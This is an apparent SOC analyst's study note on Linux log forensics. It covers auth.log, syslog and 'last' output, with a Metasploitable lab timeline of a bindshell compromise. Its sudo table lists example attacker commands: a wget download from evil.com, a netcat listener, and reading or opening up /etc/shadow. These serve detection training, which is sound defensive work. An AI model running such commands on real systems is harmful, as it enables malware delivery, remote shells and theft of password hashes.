# Linux Logs — SOC Analyst Notes

## Why Linux Logs Matter

Linux logs are the primary evidence trail on any Linux endpoint or server. Unlike Windows which centralizes everything in Event Viewer, Linux distributes logs across multiple flat files in `/var/log/` — knowing which file to look in for which type of event is what makes investigation fast instead of slow.

---

## Primary Log Files — Know These Cold

| Log | Path | What it records | SOC relevance |
|---|---|---|---|
| **auth.log** | `/var/log/auth.log` | All authentication — SSH logins, sudo usage, su, failed logins | **Primary** — equivalent to Windows Security log |
| **syslog** | `/var/log/syslog` | General system events — services, kernel messages, application logs | **Primary** — broad system activity |
| **kern.log** | `/var/log/kern.log` | Kernel-level events only | Hardware issues, kernel errors, unusual network activity |
| **boot.log** | `/var/log/boot.log` | Boot process events | Persistence mechanisms running at boot |
| **dpkg.log** | `/var/log/dpkg.log` | Package installation/removal | Did attacker install software? Check here |
| **apache2/** | `/var/log/apache2/` | Web server access and error logs | Web attacks — SQLi, XSS, directory traversal |
| **mysql/** | `/var/log/mysql/` | Database logs | Database attacks, credential attempts |

**Note on modern systems:** newer Debian/Kali systems use `systemd-journal` instead of flat log files. Use `journalctl` instead of reading auth.log directly:
```bash
sudo journalctl _COMM=sshd --no-pager | tail -30
sudo journalctl -u ssh --no-pager | tail -30
```

---

## Essential Log Reading Commands

```bash
# Read last 50 lines of a log (start from most recent)
sudo tail -50 /var/log/auth.log

# Follow a log in real time (watch new entries as they appear)
sudo tail -f /var/log/auth.log

# Search for specific pattern
sudo grep -i "failed\|error\|attack" /var/log/auth.log

# Search across multiple terms
sudo grep -i "authentication\|failed\|accepted\|sudo" /var/log/syslog | tail -30

# Show login history
sudo last

# Show failed login attempts specifically
sudo lastb
```

---

## Reading auth.log — Real Lab Observations

### The Log Format
```
Month Day HH:MM:SS hostname service[PID]: message
```

### Real Events Captured on Metasploitable

**Failed login then success (normal user behavior):**
```
Jul 9 02:58:51 metasploitable login[4635]: pam_unix(login:auth): authentication failure; logname=LOGIN uid=0 tty=tty1 user=msfadmin
Jul 9 02:58:53 metasploitable login[4635]: FAILED LOGIN (1) on 'tty1' FOR 'msfadmin'
Jul 9 02:58:58 metasploitable login[4635]: pam_unix(login:session): session opened for user msfadmin
```
**Decoded:** One failed attempt (mistyped password) followed by successful login at `tty1` (physical console). Single failure then success = normal user mistake. `tty1` = direct keyboard access, not network.

**sudo command execution — full command logged:**
```
Jul 9 03:00:16 metasploitable sudo: msfadmin : TTY=tty1 ; PWD=/home/msfadmin ; USER=root ; COMMAND=/bin/cat /var/log/auth.log
Jul 9 03:00:16 metasploitable sudo: pam_unix(sudo:session): session opened for user root by msfadmin(uid=0)
Jul 9 03:00:16 metasploitable sudo: pam_unix(sudo:session): session closed for user root
```
**Decoded:** msfadmin ran `sudo cat /var/log/auth.log` — temporarily elevated to root, command completed, session closed immediately. **Critical forensic capability: Linux logs the exact command run with sudo, not just that sudo was used.**

---

## `sudo last` — Login History Analysis

`last` reads `/var/log/wtmp` and shows all login/logout history. Format:
```
username  terminal  source  date  time  duration
```

### Real Lab Output — Attack Evidence Found

```
msfadmin  tty1        Thu Jul 9  02:58  still logged in
root      pts/0  :0.0 Thu Jul 9  02:55  still logged in
reboot    system boot  Thu Jul 9  02:55 - 03:29
msfadmin  tty1        Thu Jul 9  02:15 - crash  (00:39)
root      pts/0  :0.0 Thu Jul 9  02:14 - crash  (00:41)
reboot    system boot  Thu Jul 9  02:14 - 03:29
```

### Reading This as an Attack Timeline

| Time | Entry | What it actually means |
|---|---|---|
| `02:14` | `root pts/0 - crash` | **Bindshell exploitation** — root accessed via pseudo-terminal (netcat), session ended abruptly |
| `02:15` | `msfadmin tty1 - crash` | Physical console login, also ended in crash |
| `02:55` | System reboot | Machine restarted |
| `02:55` | `root pts/0` | Another remote root connection |
| `02:58` | `msfadmin tty1` | Physical console login (our own login) |

**Terminal types and what they mean:**

| Terminal | Meaning | SOC relevance |
|---|---|---|
| `tty1`, `tty2` | Physical console — direct keyboard access | User sitting at the machine |
| `pts/0`, `pts/1` | Pseudo-terminal — remote/programmatic access | SSH, netcat, reverse shells |
| `pts/0` with source `:0.0` | Local X session | GUI application terminal |

**The critical finding: `root pts/0 - crash` at 02:14**
- `root` = highest privilege
- `pts/0` = remote/programmatic access (not physical keyboard)
- `crash` = connection terminated abruptly without clean logout (what netcat does when closed)
- No preceding SSH login = not a legitimate remote admin session

**In a real SOC investigation:** `root` accessing a system via `pts/0` at an unexpected time, ending in `crash`, with no corresponding SSH authentication in auth.log = **immediate critical escalation — remote root compromise confirmed.**

---

## syslog — Indirect Attack Evidence

Even when an attack doesn't directly touch authentication, syslog captures the system's reaction.

### Real Lab Finding — Nmap Scan Evidence in syslog

```
Jul 9 02:55:24 kernel: isapnp: Scanning for PnP cards...
Jul 9 02:55:24 kernel: e1000: eth0: e1000_probe: Intel(R) PRO/1000 Network Connection
Jul 9 02:55:25 mysqld[4231]: ready for connections
```

**Decoded:** At `02:55` (exact time of Nmap scan):
- Kernel detected heavy network activity and logged the network interface being probed
- MySQL reset its connection listener because the scan touched port 3306

**Key lesson:** Nmap doesn't log itself on the target — but the system's reaction to the scan does appear in logs. Correlating timestamps across auth.log, syslog, and `last` output reconstructs the full attack timeline even when no single log captures everything.

---

## Sudo Commands — The Most Powerful Forensic Evidence

Linux logs the **exact command run with sudo**, not just that sudo was used. This is what makes Linux auth.log so powerful for investigations:

| What you see in auth.log | What it means |
|---|---|
| `COMMAND=/bin/bash` | Attacker escalated to interactive root shell |
| `COMMAND=/bin/cat /etc/shadow` | Attacker dumped password hashes |
| `COMMAND=/bin/nc -lvp 4444` | Attacker opened a reverse shell listener |
| `COMMAND=/usr/bin/wget http://evil.com/malware` | Attacker downloaded malware |
| `COMMAND=/bin/chmod 777 /etc/shadow` | Attacker made shadow file world-readable |

Each of these tells you not just that an attacker was present, but **exactly what they did** — the difference between "someone was here" and a complete forensic timeline.

---

## Multi-Source Log Correlation — The Real Analyst Skill

No single log file tells the complete story. Real investigation correlates timestamps across multiple sources:

```
Attack timeline reconstructed from multiple logs:

02:14  last output:    root pts/0 login via pseudo-terminal (bindshell connection)
02:14  syslog:         MySQL resets, kernel detects network probe
02:55  syslog:         Heavy network activity (Nmap scan)
02:55  last output:    System reboot
02:58  auth.log:       msfadmin failed login then success on tty1
03:00  auth.log:       sudo cat /var/log/auth.log (us reading logs)
```

**The attacker didn't announce themselves — but the logs tell the story anyway.**

---

## Quick Reference — What to Check First on a Compromised Linux System

```
1. sudo last          → who logged in, when, from where, how session ended
2. sudo lastb         → failed login attempts (brute force evidence)
3. sudo tail -100 /var/log/auth.log   → authentication and sudo history
4. sudo grep "sudo" /var/log/auth.log → exactly what commands were run as root
5. ls -la /tmp        → malware dropped here?
6. ls -la /etc/shadow → permissions correct?
7. sudo cat /etc/passwd → new accounts added?
8. sudo crontab -l && sudo crontab -l -u root → persistence via cron?
```

This sequence in order gives you: who was there, what they did, what they left behind, and whether they set up persistence.
